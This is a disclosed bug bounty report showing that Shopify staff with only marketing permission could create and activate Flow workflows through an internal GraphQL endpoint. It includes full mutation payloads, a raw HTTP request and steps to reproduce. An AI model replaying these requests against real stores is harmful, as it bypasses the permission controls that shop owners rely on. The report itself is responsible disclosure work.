# Staff can create workflows in Shopify Admin without apps permission

## Report Details
- **Report ID**: 1521336
- **URL**: https://hackerone.com/reports/1521336
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-03-24T17:11:18.158Z
- **Disclosed**: 2022-10-13T18:53:22.373Z

## Reporter
- **Username**: jmp_35p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
[add summary of the vulnerability]

According to publicly available docs, Flow can be accessed in two ways.
1. through the Shopify organization admin (Shopify plus)
2. by installing the Shopify Flow app.
I stumbled on /admin/internal/web/graphql/flow endpoint which is accessible to a staff member with only `marketing` permission. The said endpoint makes it possible to create workflows and perform other flow related actions without using any of the two methods stated above. To substantiate my claim, I created a workflow that 'adds a tag whenever a customer registers an account' (created an account tag) see the image below for details.
{F1667015} 

It's worth mentioning that the workflows created this way don't show up in the app or any where else, information about them can only be gotten by hitting the same endpoint. There are couple of other mutations that are accessible but I used only `templateInstall` and `workflowActivate` for demonstration. What follows below are example GraphQL queries and steps to reproduce.
First, we need to install a template to activate. 
See the image below for details
{F1667014}

```
{"operationName":"templateInstall","variables":{"templateId":"977bf9aa-ae6a-4a7c-b3f2-051c9e856c6f","shopIds":[]},"query":"mutation templateInstall($templateId: ID!, $shopIds: [ID!]!) {\n  templateInstall(templateId: $templateId, shopIds: $shopIds) {\n    installed {\n      shopId\n      workflowId\n      workflowVersion\n      __typename\n    }\n    errors {\n      shopId\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}

```
After installing a template of our choice, we then activate the workflow. 
See the image below for details.
{F1667018}

```
{"operationName":"activateWorkflowMutation","variables":{"workflowId":"240ed0ee-d099-4066-8eac-7ce777ef4fe4","version":"acc5731a-7802-4622-857b-0191f8c0ee9d","contextType":"shop","contextId":"10979704928"},"query":"mutation activateWorkflowMutation($workflowId: ID!, $version: String, $contextType: String!, $contextId: ID!) {\n  workflowActivate(\n    workflowId: $workflowId\n    version: $version\n    contextType: $contextType\n    contextId: $contextId\n  ) {\n    workflow {\n      ...workflow\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment workflow on Workflow {\n  id\n  name\n  steps {\n    ...step\n    __typename\n  }\n  links {\n    ...link\n    __typename\n  }\n  activations {\n    ...activation\n    __typename\n  }\n  lastUpdated\n  activationState\n  versionState\n  version\n  parentVersion\n  shopifyDomain\n  shopifyName\n  owner {\n    contextId\n    contextType\n    __typename\n  }\n  ...validationErrors\n  tags\n  __typename\n}\n\nfragment step on Step {\n  id\n  task {\n    ...task\n    __typename\n  }\n  position {\n    x\n    y\n    __typename\n  }\n  inputPort {\n    name\n    identifier\n    __typename\n  }\n  outputPorts {\n    name\n    identifier\n    __typename\n  }\n  ...stepConfig\n  note\n  description\n  __typename\n}\n\nfragment task on Task {\n  id\n  label\n  description\n  dynamicDescriptionTemplate\n  taskType\n  path\n  inputPort {\n    id\n    name\n    __typename\n  }\n  outputPorts {\n    id\n    name\n    __typename\n  }\n  iconUrl\n  documentationUrl\n  __typename\n}\n\nfragment stepConfig on Step {\n  id\n  taskType\n  task {\n    id\n    label\n    description\n    __typename\n  }\n  configFields {\n    __typename\n    ... on ArrayConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      supportsLiquid\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on CollectionsConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n    ... on BooleanConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on MapConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      supportsLiquid\n      description\n      label\n      keyHeader\n      valueHeader\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on SelectConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      options {\n        label\n        value\n        __typename\n      }\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on TextConfigField {\n      valuePlaceholder\n      supportsLiquid\n      stepConfigFieldIdentifier\n      description\n      label\n      rows\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on CommerceObjectConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleObjectTypes\n      __typename\n    }\n    ... on IntegerConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on FloatConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on MarketingActivityConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on DurationConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleUnits\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on WeightConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      possibleUnits\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on RecurrenceConfigField {\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      validations {\n        id\n        options\n        errorMessage\n        __typename\n      }\n      __typename\n    }\n    ... on ShippingPackageConfigField {\n      defaultValue\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n    ... on ShippingCarrierServicesConfigField {\n      defaultValue\n      valuePlaceholder\n      stepConfigFieldIdentifier\n      description\n      label\n      value\n      errors {\n        title\n        message\n        __typename\n      }\n      __typename\n    }\n  }\n  condition {\n    __typename\n    ... on LogicalExpression {\n      uuid\n      lhsOperationUuid\n      logicalOperator: operator\n      rhsOperationUuid\n      parentUuid\n      __typename\n    }\n    ... on ArrayExpression {\n      uuid\n      arrayPathUuid\n      arrayItemKeyUuid\n      arrayOperator: operator\n      operationUuid\n      parentUuid\n      __typename\n    }\n    ... on Comparison {\n      uuid\n      lhsUuid\n      comparisonOperator: operator\n      rhsUuid\n      valueType\n      parentUuid\n      __typename\n    }\n    ... on EnvironmentValue {\n      uuid\n      value\n      parentUuid\n      fullEnvironmentPath\n      __typename\n    }\n    ... on LiteralValue {\n      uuid\n      value\n      parentUuid\n      __typename\n    }\n  }\n  __typename\n}\n\nfragment link on Link {\n  id\n  fromStepId\n  fromPortIdentifier\n  toStepId\n  toPortIdentifier\n  __typename\n}\n\nfragment activation on Activation {\n  contextId\n  contextType\n  __typename\n}\n\nfragment validationErrors on Workflow {\n  validationErrors {\n    __typename\n    ... on StepValidationError {\n      stepId\n      configFieldErrors {\n        stepConfigFieldIdentifier\n        message\n        position\n        configFieldLabel\n        errorCategory\n        __typename\n      }\n      conditionErrors {\n        nodeUuid\n        message\n        __typename\n      }\n      connectorErrors {\n        message\n        __typename\n      }\n      __typename\n    }\n    ... on WorkflowValidationError {\n      message\n      __typename\n    }\n  }\n  __typename\n}\n"}

```


## Shops Used to Test:
[add list of <shop>.myshopify.com domains here, if applicable]

https://davidola2.myshopify.com

## Relevant Request IDs:
[add list of Request ID values (found in X-Request-ID response header)]

856e1132-73d1-4f2f-9013-efbc7f8f0d94
2e174ced-69c0-40bb-8b19-c60f75636e61

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1. Obtain any POST request and send to the repeater tab.
2. Edit it so it looks something like the one below. The key thing is that we'd be hitting the /admin/internal/web/graphql/flow endpoint. See the image below for details.
{F1667017}
```
POST /admin/internal/web/graphql/flow HTTP/2
Host: davidola2.myshopify.com
Cookie: _secure_admin_session_id=93f2f; _secure_admin_session_id_csrf=93f2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: VD...
Origin: https://davidola2.myshopify.com
Content-Length: 44
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1

{"operationName":"AppAccessTimeUpdate","variables":{"appId":"gid://shopify/App/1602671"},"query":"mutation AppAccessTimeUpdate($appId: ID!) {\n  appAccessTimeUpdate(id: $appId) {\n    app {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
3. Now, replace the request body with the queries provided above, starting with the first one.

I'm not so sure if this endpoint should be accessible at all, especially to staffs without the required permission. You'd hit this endpoint with an introspection query to know what mutations are exposed. 

## Supporting Material:
[list any additional material (e.g. screenshots, video, etc)]

  * [attachment / reference]

flow_A.png, flow_B.png, flow_C.png and flow_D.png

## Impact

Staff can perform actions that require more permission.

## Attachments
- flow_B.png
- flow_A.png
- flow_D.png
- flow_C.png
